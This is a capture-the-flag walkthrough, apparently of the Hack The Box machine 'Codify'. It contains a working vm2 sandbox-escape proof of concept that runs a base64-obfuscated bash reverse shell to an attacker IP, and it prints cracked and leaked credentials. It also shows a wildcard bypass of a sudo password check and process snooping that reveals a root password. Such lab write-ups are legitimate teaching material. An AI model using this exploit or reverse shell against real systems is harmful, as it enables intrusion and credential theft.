Standard `nmap` scan reveals that 3 of the most used ports are open with the entry for `/etc/hosts`:

```
# Nmap 7.94 scan initiated Fri Nov 10 15:37:01 2023 as: nmap -sC -sV -oN nmap-scsv 10.129.86.179
Nmap scan report for 10.129.86.179
Host is up (0.087s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://codify.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

In the About section is more information about Code Editor with a link to exact version of `vm2` library on GitHub. However in the Security tab we can find that on 17th April (6 days after actual version was released) was updated with a critical vulnerability in the framework where exception sanitation allows attacker to raise an unsanitized host exception inside `handleException()`, which can be used to escape the sandbox. PoC of the vulnerability can be found at https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244

This gives the first peek into the file system of the machine, its accounts and services:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
joshua:x:1000:1000:,,,:/home/joshua:/bin/bash
svc:x:1001:1001:,,,:/home/svc:/bin/bash
fwupd-refresh:x:114:122:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

Getting reverse shell requires a small workaround with base64 encryption on `http://codify.htb/editor`:

```
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yMS8xMzM3IDA+JjE= | base64 -d | bash -
```

```js
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yMS8xMzM3IDA+JjE= | base64 -d | bash -');
}
`

console.log(vm.run(code));
```

After upgrading the shell I've located in `/var/www/contact/tickets.db` is hash for user `joshua:$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2`. The app uses in the backed express.js with sqlite3 which confirms `ss -tuln` enumeration with the port 3306 listening on localhost. Cracking the has with `john` brings up trivial password: `spongebob1`

## Privilege escalation

`sudo -l` indicates that joshua may run script `/opt/scripts/mysql-backup.sh` as a root user:

```shell
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'

```

`Mysql` login and enumeration `/usr/bin/mysql -u joshua -h 0.0.0.0 -P 3306 -p`:

```mysql
mysql> select User,Password from user;
+-------------+-------------------------------------------+
| User        | Password                                  |
+-------------+-------------------------------------------+
| mariadb.sys |                                           |
| root        | *4ECCEBD05161B6782081E970D9D2C72138197218 |
| root        | *4ECCEBD05161B6782081E970D9D2C72138197218 |
| passbolt    | *63DA7233CC5151B814CBEC5AF8B3EAC43347A203 |
| joshua      | *323A5EDCBFA127CC75F6C155457533AC1D5C4921 |
| root        | *4ECCEBD05161B6782081E970D9D2C72138197218 |
+-------------+-------------------------------------------+
```

Attempt to break the mysql5 hash was unsuccessful with any of the dictionaries using:

In the meantime I have returned to the script `/opt/scripts/mysql-backup.sh` and after elevating it with `sudo` and using * wildcard for root password, the script was executed. Because there is a password retrieved from `/root/.creds` used in the command line of a script I have spied on the processes running with `pspy32` and on my second attempt successfully retrieved the root password.

```shell
PID=49721  | /usr/bin/mysqldump --force -u root -h 0.0.0.0 -P 3306 -p kljh12k3jhaskjh12kjh3 mysql
```